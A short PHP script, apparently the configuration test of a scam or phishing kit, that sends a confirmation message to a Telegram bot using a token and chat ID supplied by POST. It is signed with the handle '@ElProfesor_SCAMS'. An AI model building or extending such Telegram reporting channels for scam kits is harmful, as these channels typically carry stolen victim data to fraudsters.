<?php
session_start();
if($_SESSION["login"] == "y"){
	define('BOT_TOKEN', $_POST["token"]);
	define('CHAT_ID', $_POST["chatid"]);
	function enviar_telegram($msj){
		$queryArray = [
			'chat_id' => CHAT_ID,
			'text' => $msj,
		];
		$url = 'https://api.telegram.org/bot'.BOT_TOKEN.'/sendMessage?'. http_build_query($queryArray);
		$result = file_get_contents($url);
	}
	enviar_telegram("Los datos son correctos\nPuedes guardar la configuracion actual.\n\n@ElProfesor_SCAMS");
}
?>